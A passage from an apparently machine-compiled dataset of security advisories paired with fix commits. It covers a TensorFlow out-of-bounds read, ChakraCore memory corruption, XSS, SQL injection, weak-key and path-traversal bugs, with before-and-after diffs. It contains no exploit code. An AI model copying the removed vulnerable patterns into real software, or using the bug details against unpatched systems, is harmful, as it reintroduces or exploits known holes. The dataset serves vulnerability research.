[implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/resource_variable_ops.cc#L660-L668) does not check that the `batch_dims` value that the user supplies is less than the rank of the input tensor.\n\nSince the implementation uses several for loops over the dimensions of `tensor`, this results in reading data from outside the bounds of heap allocated buffer backing the tensor:\n\n```cc\n    \/\/ batch_dims_ = > params.dims() (10 > 2)\n    for (int i = 0; i < batch_dims_; ++i) {\n      result_shape.AddDim(params.dim_size(i));\n    }\n    for (int i = batch_dims_; i < indices.dims(); ++i) {\n      result_shape.AddDim(indices.dim_size(i));\n    }\n    for (int i = batch_dims_ + 1; i < params.dims(); ++i) {\n      result_shape.AddDim(params.dim_size(i));\n    }\n```\n\nIn debug mode, `.dim_size(i)` validates that the argument is less than `.dims()` using a `DCHECK`. But the `DCHECK` is a no-op in release builds.\n\n### Patches\nWe have patched the issue in GitHub commit [bc9c546ce7015c57c2f15c168b3d9201de679a1d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bc9c546ce7015c57c2f15c168b3d9201de679a1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bc9c546ce7015c57c2f15c168b3d9201de679a1d","commit_sha":"bc9c546ce7015c57c2f15c168b3d9201de679a1d","patch":"SINGLE","chain_ord":"['bc9c546ce7015c57c2f15c168b3d9201de679a1d']","before_first_fix_commit":"{'d5f28c9b17220a9c7b3a4c93fc6c3fea6949cadd'}","last_fix_commit":"bc9c546ce7015c57c2f15c168b3d9201de679a1d","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 04:37:59","message":"Prevent heap oob access in `resource_variable_ops.cc`\n\nPiperOrigin-RevId: 387936433\nChange-Id: I9e71ddaa8dbd51ec6afbf163a6b3b591f193b4f6","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/resource_variable_ops.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/bc9c546ce7015c57c2f15c168b3d9201de679a1d\/tensorflow%2Fcore%2Fkernels%2Fresource_variable_ops.cc', 'patch': '@@ -660,6 +660,11 @@ class ResourceGatherOp : public OpKernel {\\n     OP_REQUIRES(\\n         c, TensorShapeUtils::IsVectorOrHigher(params.shape()),\\n         errors::InvalidArgument(\"params must be at least 1 dimensional\"));\\n+    OP_REQUIRES(\\n+        c, params.shape().dims() >= batch_dims_,\\n+        errors::InvalidArgument(\"params must have at least \", batch_dims_,\\n+                                \" (batch_dims) dimensions but it has shape \",\\n+                                params.shape().DebugString()));\\n \\n     \/\/ Check that we have enough index space\\n     const int64_t N = indices.NumElements();'}}","message_norm":"prevent heap oob access in `resource_variable_ops.cc`\n\npiperorigin-revid: 387936433\nchange-id: i9e71ddaa8dbd51ec6afbf163a6b3b591f193b4f6","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('387936433', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/resource_variable_ops.cc'])","num_files":1.0},{"index":134,"vuln_id":"GHSA-2rfj-2mwp-787v","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/3d6226cc2d1077537220361c82e34a362c6c76ee', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/36644ee0d4cc2bc97a3cd49c3540e6eea193182a'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0989, CVE-2019-0991, CVE-2019-0992, CVE-2019-1002, CVE-2019-1003, CVE-2019-1024, CVE-2019-1051, CVE-2019-1052.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/36644ee0d4cc2bc97a3cd49c3540e6eea193182a","commit_sha":"36644ee0d4cc2bc97a3cd49c3540e6eea193182a","patch":"MULTI","chain_ord":"['36644ee0d4cc2bc97a3cd49c3540e6eea193182a', '3d6226cc2d1077537220361c82e34a362c6c76ee']","before_first_fix_commit":"{'d797e3f00e34c12c8c0ae52f56344325439dccd7', 'eabf77ad17010f220639e5261798da9ac14e43e3'}","last_fix_commit":"3d6226cc2d1077537220361c82e34a362c6c76ee","chain_ord_pos":1.0,"commit_datetime":"05\/15\/2019, 23:54:48","message":"CVE-2019-0993","author":"Paul Leathers","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'lib\/Runtime\/Language\/JavascriptOperators.cpp': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/36644ee0d4cc2bc97a3cd49c3540e6eea193182a\/lib%2FRuntime%2FLanguage%2FJavascriptOperators.cpp', 'patch': \"@@ -9655,6 +9655,10 @@ using namespace Js;\\n             Var result = CALL_ENTRYPOINT(threadContext, marshalledFunction->GetEntryPoint(), function, CallInfo(flags, 1), thisVar);\\n             result = CrossSite::MarshalVar(requestContext, result);\\n \\n+            \/\/ Set implicit call flags so we bail out if we're trying to propagate the value forward, e.g., from a compare. Subsequent calls\\n+            \/\/ to the getter may produce different results.\\n+            threadContext->AddImplicitCallFlags(ImplicitCall_Accessor);\\n+\\n             return result;\\n         });\\n     }\"}}","message_norm":"cve-2019-0993","language":"ro","entities":"[('cve-2019-0993', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Runtime\/Language\/JavascriptOperators.cpp'])","num_files":1.0},{"index":141,"vuln_id":"GHSA-2v5j-q74q-r53f","cwe_id":"{'CWE-79'}","score":8.8,"chain":"{'https:\/\/github.com\/django-helpdesk\/django-helpdesk\/commit\/a22eb0673fe0b7784f99c6b5fd343b64a6700f06'}","dataset":"osv","summary":"django-helpdesk is vulnerable to Cross-site Scripting django-helpdesk is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').","published_date":"2021-12-03","chain_len":1,"project":"https:\/\/github.com\/django-helpdesk\/django-helpdesk","commit_href":"https:\/\/github.com\/django-helpdesk\/django-helpdesk\/commit\/a22eb0673fe0b7784f99c6b5fd343b64a6700f06","commit_sha":"a22eb0673fe0b7784f99c6b5fd343b64a6700f06","patch":"SINGLE","chain_ord":"['a22eb0673fe0b7784f99c6b5fd343b64a6700f06']","before_first_fix_commit":"{'7097c9c4c0b255ec1f10f3ea14fa2b9c47f6c706'}","last_fix_commit":"a22eb0673fe0b7784f99c6b5fd343b64a6700f06","chain_ord_pos":1.0,"commit_datetime":"11\/19\/2021, 16:11:33","message":"Update pattern","author":"noobpk","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'helpdesk\/models.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/django-helpdesk\/django-helpdesk\/raw\/a22eb0673fe0b7784f99c6b5fd343b64a6700f06\/helpdesk%2Fmodels.py', 'patch': '@@ -56,7 +56,7 @@ def get_markdown(text):\\n     if not text:\\n         return \"\"\\n \\n-    pattern = fr\\'([\\\\[\\\\s\\\\S\\\\]]*?)\\\\(([\\\\s\\\\S]*?):([\\\\[\\\\s\\\\S\\\\]]*?)\\\\)\\'\\n+    pattern = fr\\'([\\\\[\\\\s\\\\S\\\\]]*?)\\\\(([\\\\s\\\\S]*?):([\\\\s\\\\S]*?)\\\\)\\'\\n     # Regex check\\n     if re.match(pattern, text):\\n         # get get value of group regex'}}","message_norm":"update pattern","language":"it","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"REDUNDANT_MESSAGE","list_files":"dict_keys(['helpdesk\/models.py'])","num_files":1.0},{"index":144,"vuln_id":"GHSA-2v7p-f4qm-r5pc","cwe_id":"{'CWE-89'}","score":7.5,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/523a735ab94f004459b84ffdfd3db784586bbd82'}","dataset":"osv","summary":"SQL Injection found in Pimcore Pimcore is an open source data & experience management platform. A SQL injection was discovered in GridHelperService.php in GitHub repository pimcore\/pimcore prior to 10.3.6.","published_date":"2022-04-23","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/523a735ab94f004459b84ffdfd3db784586bbd82","commit_sha":"523a735ab94f004459b84ffdfd3db784586bbd82","patch":"SINGLE","chain_ord":"['523a735ab94f004459b84ffdfd3db784586bbd82']","before_first_fix_commit":"{'f29d3b2f305865c6e9884c460fb35bcf21bcf29f'}","last_fix_commit":"523a735ab94f004459b84ffdfd3db784586bbd82","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2022, 09:05:32","message":"Fixed column quoting in GridHelperService","author":"Bernhard Rusch","comments":null,"stats":"{'additions': 5, 'deletions': 2, 'total': 7}","files":"{'bundles\/AdminBundle\/Helper\/GridHelperService.php': {'additions': 5, 'deletions': 2, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/523a735ab94f004459b84ffdfd3db784586bbd82\/bundles%2FAdminBundle%2FHelper%2FGridHelperService.php', 'patch': \"@@ -332,12 +332,13 @@ public function getFilterCondition($filterJson, ClassDefinition $class, $tablePr\\n                         } elseif ($filterField == 'id') {\\n                             $conditionPartsFilters[] = 'oo_id ' . $operator . ' ' . $db->quote($filter['value']);\\n                         } else {\\n+                            $filterField = $db->quoteIdentifier('o_' . $filterField);\\n                             if ($filter['type'] == 'date' && $operator == '=') {\\n                                 \/\/if the equal operator is chosen with the date type, condition has to be changed\\n                                 $maxTime = $filter['value'] + (86400 - 1); \/\/specifies the top point of the range used in the condition\\n-                                $conditionPartsFilters[] = '`o_' . $filterField . '` BETWEEN ' . $db->quote($filter['value']) . ' AND ' . $db->quote($maxTime);\\n+                                $conditionPartsFilters[] = $filterField . ' BETWEEN ' . $db->quote($filter['value']) . ' AND ' . $db->quote($maxTime);\\n                             } else {\\n-                                $conditionPartsFilters[] = '`o_' . $filterField . '` ' . $operator . ' ' . $db->quote($filter['value']);\\n+                                $conditionPartsFilters[] = $filterField . ' ' . $operator . ' ' . $db->quote($filter['value']);\\n                             }\\n                         }\\n                     }\\n@@ -780,6 +781,8 @@ public function prepareAssetListingForGrid($allParams, $adminUser)\\n \\n                 if ($filterField == 'fullpath') {\\n                     $filterField = 'CONCAT(path,filename)';\\n+                }else {\\n+                    $filterField = $db->quoteIdentifier($filterField);\\n                 }\\n \\n                 if (isset($filterDef[1]) && $filterDef[1] == 'system') {\"}}","message_norm":"fixed column quoting in gridhelperservice","language":"en","entities":"[('fixed', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Helper\/GridHelperService.php'])","num_files":1.0},{"index":152,"vuln_id":"GHSA-2wc6-2rcj-8v76","cwe_id":"{'CWE-1240'}","score":6.5,"chain":"{'https:\/\/github.com\/sodiumoxide\/sodiumoxide\/commit\/24c7a5550807ac8a09648b5878f19d14c3a69135'}","dataset":"osv","summary":"scalarmult() vulnerable to degenerate public keys The `scalarmult()` function included in previous versions of this crate\naccepted all-zero public keys, for which the resulting Diffie-Hellman shared\nsecret will always be zero regardless of the private key used.\n\nThis issue was fixed by checking for this class of keys and rejecting them\nif they are used.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/sodiumoxide\/sodiumoxide","commit_href":"https:\/\/github.com\/sodiumoxide\/sodiumoxide\/commit\/24c7a5550807ac8a09648b5878f19d14c3a69135","commit_sha":"24c7a5550807ac8a09648b5878f19d14c3a69135","patch":"SINGLE","chain_ord":"['24c7a5550807ac8a09648b5878f19d14c3a69135']","before_first_fix_commit":"{'12d49e8ed1b53821465f24312695376eb86c89d2'}","last_fix_commit":"24c7a5550807ac8a09648b5878f19d14c3a69135","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2017, 19:24:31","message":"Check the return value of `scalarmult()`. Closes #154","author":"Daniel Ashhami","comments":null,"stats":"{'additions': 55, 'deletions': 46, 'total': 101}","files":"{'src\/crypto\/scalarmult\/curve25519.rs': {'additions': 55, 'deletions': 46, 'changes': 101, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sodiumoxide\/sodiumoxide\/raw\/24c7a5550807ac8a09648b5878f19d14c3a69135\/src%2Fcrypto%2Fscalarmult%2Fcurve25519.rs', 'patch': '@@ -23,14 +23,20 @@ new_type! {\\n \\n \/\/\/ `scalarmult()` multiplies a group element `p`\\n \/\/\/ by an integer `n`. It returns the resulting group element\\n-\/\/\/ `q`.\\n+\/\/\/ `Ok(q)`.\\n+\/\/\/ If the the `GroupElement` is all zero, `scalarmult()` returns `Err(())` since\\n+\/\/\/ the resulting `GroupElement` would be all zero, no matter the `Scalar`.\\n pub fn scalarmult(&Scalar(ref n): &Scalar,\\n-                  &GroupElement(ref p): &GroupElement) -> GroupElement {\\n+                  &GroupElement(ref p): &GroupElement)\\n+                  -> Result<GroupElement, ()> {\\n     let mut q = [0; GROUPELEMENTBYTES];\\n     unsafe {\\n-        ffi::crypto_scalarmult_curve25519(&mut q, n, p);\\n+        if ffi::crypto_scalarmult_curve25519(&mut q, n, p) != 0 {\\n+            Err(())\\n+        } else {\\n+            Ok(GroupElement(q))\\n+        }\\n     }\\n-    GroupElement(q)\\n }\\n \\n \/\/\/ `scalarmult_base()` computes the scalar product of a standard\\n@@ -47,74 +53,77 @@ pub fn scalarmult_base(&Scalar(ref n): &Scalar) -> GroupElement {\\n #[cfg(test)]\\n mod test {\\n     use super::*;\\n+    use randombytes::randombytes_into;\\n \\n     #[test]\\n     fn test_vector_1() {\\n         \/\/ corresponding to tests\/scalarmult.c and tests\/scalarmult3.cpp from NaCl\\n-        let alicesk = Scalar([0x77,0x07,0x6d,0x0a,0x73,0x18,0xa5,0x7d\\n-                             ,0x3c,0x16,0xc1,0x72,0x51,0xb2,0x66,0x45\\n-                             ,0xdf,0x4c,0x2f,0x87,0xeb,0xc0,0x99,0x2a\\n-                             ,0xb1,0x77,0xfb,0xa5,0x1d,0xb9,0x2c,0x2a]);\\n-        let alicepk_expected = [0x85,0x20,0xf0,0x09,0x89,0x30,0xa7,0x54\\n-                               ,0x74,0x8b,0x7d,0xdc,0xb4,0x3e,0xf7,0x5a\\n-                               ,0x0d,0xbf,0x3a,0x0d,0x26,0x38,0x1a,0xf4\\n-                               ,0xeb,0xa4,0xa9,0x8e,0xaa,0x9b,0x4e,0x6a];\\n+        let alicesk = Scalar([0x77, 0x07, 0x6d, 0x0a, 0x73, 0x18, 0xa5, 0x7d, 0x3c, 0x16, 0xc1,\\n+                              0x72, 0x51, 0xb2, 0x66, 0x45, 0xdf, 0x4c, 0x2f, 0x87, 0xeb, 0xc0,\\n+                              0x99, 0x2a, 0xb1, 0x77, 0xfb, 0xa5, 0x1d, 0xb9, 0x2c, 0x2a]);\\n+        let alicepk_expected = [0x85, 0x20, 0xf0, 0x09, 0x89, 0x30, 0xa7, 0x54, 0x74, 0x8b, 0x7d,\\n+                                0xdc, 0xb4, 0x3e, 0xf7, 0x5a, 0x0d, 0xbf, 0x3a, 0x0d, 0x26, 0x38,\\n+                                0x1a, 0xf4, 0xeb, 0xa4, 0xa9, 0x8e, 0xaa, 0x9b, 0x4e, 0x6a];\\n         let GroupElement(alicepk) = scalarmult_base(&alicesk);\\n         assert!(alicepk == alicepk_expected);\\n     }\\n \\n     #[test]\\n     fn test_vector_2() {\\n         \/\/ corresponding to tests\/scalarmult2.c and tests\/scalarmult4.cpp from NaCl\\n-        let bobsk = Scalar([0x5d,0xab,0x08,0x7e,0x62,0x4a,0x8a,0x4b\\n-                           ,0x79,0xe1,0x7f,0x8b,0x83,0x80,0x0e,0xe6\\n-                           ,0x6f,0x3b,0xb1,0x29,0x26,0x18,0xb6,0xfd\\n-                           ,0x1c,0x2f,0x8b,0x27,0xff,0x88,0xe0,0xeb]);\\n-        let bobpk_expected = [0xde,0x9e,0xdb,0x7d,0x7b,0x7d,0xc1,0xb4\\n-                             ,0xd3,0x5b,0x61,0xc2,0xec,0xe4,0x35,0x37\\n-                             ,0x3f,0x83,0x43,0xc8,0x5b,0x78,0x67,0x4d\\n-                             ,0xad,0xfc,0x7e,0x14,0x6f,0x88,0x2b,0x4f];\\n+        let bobsk = Scalar([0x5d, 0xab, 0x08, 0x7e, 0x62, 0x4a, 0x8a, 0x4b, 0x79, 0xe1, 0x7f,\\n+                            0x8b, 0x83, 0x80, 0x0e, 0xe6, 0x6f, 0x3b, 0xb1, 0x29, 0x26, 0x18,\\n+                            0xb6, 0xfd, 0x1c, 0x2f, 0x8b, 0x27, 0xff, 0x88, 0xe0, 0xeb]);\\n+        let bobpk_expected = [0xde, 0x9e, 0xdb, 0x7d, 0x7b, 0x7d, 0xc1, 0xb4, 0xd3, 0x5b, 0x61,\\n+                              0xc2, 0xec, 0xe4, 0x35, 0x37, 0x3f, 0x83, 0x43, 0xc8, 0x5b, 0x78,\\n+                              0x67, 0x4d, 0xad, 0xfc, 0x7e, 0x14, 0x6f, 0x88, 0x2b, 0x4f];\\n         let GroupElement(bobpk) = scalarmult_base(&bobsk);\\n         assert!(bobpk == bobpk_expected);\\n     }\\n \\n     #[test]\\n     fn test_vector_3() {\\n         \/\/ corresponding to tests\/scalarmult5.c and tests\/scalarmult7.cpp from NaCl\\n-        let alicesk = Scalar([0x77,0x07,0x6d,0x0a,0x73,0x18,0xa5,0x7d\\n-                             ,0x3c,0x16,0xc1,0x72,0x51,0xb2,0x66,0x45\\n-                             ,0xdf,0x4c,0x2f,0x87,0xeb,0xc0,0x99,0x2a\\n-                             ,0xb1,0x77,0xfb,0xa5,0x1d,0xb9,0x2c,0x2a]);\\n-        let bobpk = GroupElement([0xde,0x9e,0xdb,0x7d,0x7b,0x7d,0xc1,0xb4\\n-                                 ,0xd3,0x5b,0x61,0xc2,0xec,0xe4,0x35,0x37\\n-                                 ,0x3f,0x83,0x43,0xc8,0x5b,0x78,0x67,0x4d\\n-                                 ,0xad,0xfc,0x7e,0x14,0x6f,0x88,0x2b,0x4f]);\\n-        let k_expected = [0x4a,0x5d,0x9d,0x5b,0xa4,0xce,0x2d,0xe1\\n-                         ,0x72,0x8e,0x3b,0xf4,0x80,0x35,0x0f,0x25\\n-                         ,0xe0,0x7e,0x21,0xc9,0x47,0xd1,0x9e,0x33\\n-                         ,0x76,0xf0,0x9b,0x3c,0x1e,0x16,0x17,0x42];\\n-        let GroupElement(k) = scalarmult(&alicesk, &bobpk);\\n+        let alicesk = Scalar([0x77, 0x07, 0x6d, 0x0a, 0x73, 0x18, 0xa5, 0x7d, 0x3c, 0x16, 0xc1,\\n+                              0x72, 0x51, 0xb2, 0x66, 0x45, 0xdf, 0x4c, 0x2f, 0x87, 0xeb, 0xc0,\\n+                              0x99, 0x2a, 0xb1, 0x77, 0xfb, 0xa5, 0x1d, 0xb9, 0x2c, 0x2a]);\\n+        let bobpk = GroupElement([0xde, 0x9e, 0xdb, 0x7d, 0x7b, 0x7d, 0xc1, 0xb4, 0xd3, 0x5b,\\n+                                  0x61, 0xc2, 0xec, 0xe4, 0x35, 0x37, 0x3f, 0x83, 0x43, 0xc8,\\n+                                  0x5b, 0x78, 0x67, 0x4d, 0xad, 0xfc, 0x7e, 0x14, 0x6f, 0x88,\\n+                                  0x2b, 0x4f]);\\n+        let k_expected = [0x4a, 0x5d, 0x9d, 0x5b, 0xa4, 0xce, 0x2d, 0xe1, 0x72, 0x8e, 0x3b, 0xf4,\\n+                          0x80, 0x35, 0x0f, 0x25, 0xe0, 0x7e, 0x21, 0xc9, 0x47, 0xd1, 0x9e, 0x33,\\n+                          0x76, 0xf0, 0x9b, 0x3c, 0x1e, 0x16, 0x17, 0x42];\\n+        let GroupElement(k) = scalarmult(&alicesk, &bobpk).unwrap();\\n         assert!(k == k_expected);\\n     }\\n \\n     #[test]\\n     fn test_vector_4() {\\n         \/\/ corresponding to tests\/scalarmult6.c from NaCl\\n-        let bobsk = Scalar([0x5d,0xab,0x08,0x7e,0x62,0x4a,0x8a,0x4b\\n-                           ,0x79,0xe1,0x7f,0x8b,0x83,0x80,0x0e,0xe6\\n-                           ,0x6f,0x3b,0xb1,0x29,0x26,0x18,0xb6,0xfd\\n-                           ,0x1c,0x2f,0x8b,0x27,0xff,0x88,0xe0,0xeb]);\\n-        let alicepk = GroupElement([0x85,0x20,0xf0,0x09,0x89,0x30,0xa7,0x54\\n-                                   ,0x74,0x8b,0x7d,0xdc,0xb4,0x3e,0xf7,0x5a\\n-                                   ,0x0d,0xbf,0x3a,0x0d,0x26,0x38,0x1a,0xf4\\n-                                   ,0xeb,0xa4,0xa9,0x8e,0xaa,0x9b,0x4e,0x6a]);\\n-        let k_expected = [0x4a,0x5d,0x9d,0x5b,0xa4,0xce,0x2d,0xe1\\n-                         ,0x72,0x8e,0x3b,0xf4,0x80,0x35,0x0f,0x25\\n-                         ,0xe0,0x7e,0x21,0xc9,0x47,0xd1,0x9e,0x33\\n-                         ,0x76,0xf0,0x9b,0x3c,0x1e,0x16,0x17,0x42];\\n-        let GroupElement(k) = scalarmult(&bobsk, &alicepk);\\n+        let bobsk = Scalar([0x5d, 0xab, 0x08, 0x7e, 0x62, 0x4a, 0x8a, 0x4b, 0x79, 0xe1, 0x7f,\\n+                            0x8b, 0x83, 0x80, 0x0e, 0xe6, 0x6f, 0x3b, 0xb1, 0x29, 0x26, 0x18,\\n+                            0xb6, 0xfd, 0x1c, 0x2f, 0x8b, 0x27, 0xff, 0x88, 0xe0, 0xeb]);\\n+        let alicepk = GroupElement([0x85, 0x20, 0xf0, 0x09, 0x89, 0x30, 0xa7, 0x54, 0x74, 0x8b,\\n+                                    0x7d, 0xdc, 0xb4, 0x3e, 0xf7, 0x5a, 0x0d, 0xbf, 0x3a, 0x0d,\\n+                                    0x26, 0x38, 0x1a, 0xf4, 0xeb, 0xa4, 0xa9, 0x8e, 0xaa, 0x9b,\\n+                                    0x4e, 0x6a]);\\n+        let k_expected = [0x4a, 0x5d, 0x9d, 0x5b, 0xa4, 0xce, 0x2d, 0xe1, 0x72, 0x8e, 0x3b, 0xf4,\\n+                          0x80, 0x35, 0x0f, 0x25, 0xe0, 0x7e, 0x21, 0xc9, 0x47, 0xd1, 0x9e, 0x33,\\n+                          0x76, 0xf0, 0x9b, 0x3c, 0x1e, 0x16, 0x17, 0x42];\\n+        let GroupElement(k) = scalarmult(&bobsk, &alicepk).unwrap();\\n         assert!(k == k_expected);\\n     }\\n+\\n+    #[test]\\n+    #[should_panic]\\n+    fn test_all_zero() {\\n+        let mut sk = [0; SCALARBYTES];\\n+        randombytes_into(&mut sk);\\n+        let sk = Scalar(sk);\\n+        let pk = GroupElement([0; GROUPELEMENTBYTES]);\\n+        let _ = scalarmult(&sk, &pk).unwrap();\\n+    }\\n }\\n \\n #[cfg(feature = \"benchmarks\")]'}}","message_norm":"check the return value of `scalarmult()`. closes #154","language":"en","entities":"[('#154', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/crypto\/scalarmult\/curve25519.rs'])","num_files":1.0},{"index":156,"vuln_id":"GHSA-2wwc-w2gw-4329","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/94181502091b7c22eb86ab1b45ce80bf7ff03aaf', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1307, CVE-2019-1308, CVE-2019-1335.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/94181502091b7c22eb86ab1b45ce80bf7ff03aaf","commit_sha":"94181502091b7c22eb86ab1b45ce80bf7ff03aaf","patch":"MULTI","chain_ord":"['94181502091b7c22eb86ab1b45ce80bf7ff03aaf', 'cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d']","before_first_fix_commit":"{'7e9a2ee60baa95ceb4f48f522f823c812ca90c80', '5989c6e038d80f92dcd8e10d725cdf45396201bb'}","last_fix_commit":"cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d","chain_ord_pos":1.0,"commit_datetime":"08\/30\/2019, 22:55:27","message":"CVE-2019-1366","author":"Paul Leathers","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/Backend\/GlobOpt.cpp': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/94181502091b7c22eb86ab1b45ce80bf7ff03aaf\/lib%2FBackend%2FGlobOpt.cpp', 'patch': '@@ -3603,7 +3603,7 @@ GlobOpt::OptSrc(IR::Opnd *opnd, IR::Instr * *pInstr, Value **indirIndexValRef, I\\n \\n         opnd->SetValueType(valueType);\\n \\n-        if(!IsLoopPrePass() && opnd->IsSymOpnd() && valueType.IsDefinite())\\n+        if(!IsLoopPrePass() && opnd->IsSymOpnd() && (valueType.IsDefinite() || valueType.IsNotTaggedValue()))\\n         {\\n             if (opnd->AsSymOpnd()->m_sym->IsPropertySym())\\n             {'}}","message_norm":"cve-2019-1366","language":"ro","entities":"[('cve-2019-1366', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOpt.cpp'])","num_files":1.0},{"index":162,"vuln_id":"GHSA-2x7h-96h5-rq84","cwe_id":"{'CWE-22'}","score":4.0,"chain":"{'https:\/\/github.com\/icsharpcode\/SharpZipLib\/commit\/5c3b293de5d65b108e7f2cd0ea8f81c1b8273f78'}","dataset":"osv","summary":"Path Traversal in SharpZipLib SharpZipLib (or #ziplib) is a Zip, GZip, Tar and BZip2 library. Starting version 1.3.0 and prior to version 1.3.3, a check was added if the destination file is under destination directory. However, it is not enforced that `destDir` ends with slash. If the `destDir` is not slash terminated like `\/home\/user\/dir` it is possible to create a file with a name thats begins with the destination directory, i.e. `\/home\/user\/dir.sh`. Because of the file name and destination directory constraints, the arbitrary file creation impact is limited and depends on the use case. Version 1.3.3 contains a patch for this vulnerability.","published_date":"2022-02-01","chain_len":1,"project":"https:\/\/github.com\/icsharpcode\/SharpZipLib","commit_href":"https:\/\/github.com\/icsharpcode\/SharpZipLib\/commit\/5c3b293de5d65b108e7f2cd0ea8f81c1b8273f78","commit_sha":"5c3b293de5d65b108e7f2cd0ea8f81c1b8273f78","patch":"SINGLE","chain_ord":"['5c3b293de5d65b108e7f2cd0ea8f81c1b8273f78']","before_first_fix_commit":"{'a0e96de70b5264f4c919b09253b1522bc7a221cc'}","last_fix_commit":"5c3b293de5d65b108e7f2cd0ea8f81c1b8273f78","chain_ord_pos":1.0,"commit_datetime":"09\/18\/2021, 09:58:11","message":"fix: specialized tar extract traversal","author":"nils m\u00e5s\u00e9n","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/ICSharpCode.SharpZipLib\/Tar\/TarArchive.cs': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/icsharpcode\/SharpZipLib\/raw\/5c3b293de5d65b108e7f2cd0ea8f81c1b8273f78\/src%2FICSharpCode.SharpZipLib%2FTar%2FTarArchive.cs', 'patch': '@@ -658,8 +658,9 @@ private void ExtractEntry(string destDir, TarEntry entry, bool allowParentTraver\\n \\t\\t\\tname = name.Replace(\\'\/\\', Path.DirectorySeparatorChar);\\n \\n \\t\\t\\tstring destFile = Path.Combine(destDir, name);\\n+\\t\\t\\tvar destFileDir = Path.GetDirectoryName(Path.GetFullPath(destFile)) ?? \"\";\\n \\n-\\t\\t\\tif (!allowParentTraversal && !Path.GetFullPath(destFile).StartsWith(destDir, StringComparison.InvariantCultureIgnoreCase))\\n+\\t\\t\\tif (!allowParentTraversal && !destFileDir.StartsWith(destDir, StringComparison.InvariantCultureIgnoreCase))\\n \\t\\t\\t{\\n \\t\\t\\t\\tthrow new InvalidNameException(\"Parent traversal in paths is not allowed\");\\n \\t\\t\\t}'}}","message_norm":"fix: specialized tar extract traversal","language":"en","entities":"[('extract traversal', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/ICSharpCode.SharpZipLib\/Tar\/TarArchive.cs'])","num_files":1.0},{"index":163,"vuln_id":"GHSA-2xgj-xhgf-ggjv","cwe_id":"{'CWE-120'}","score":3.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2', 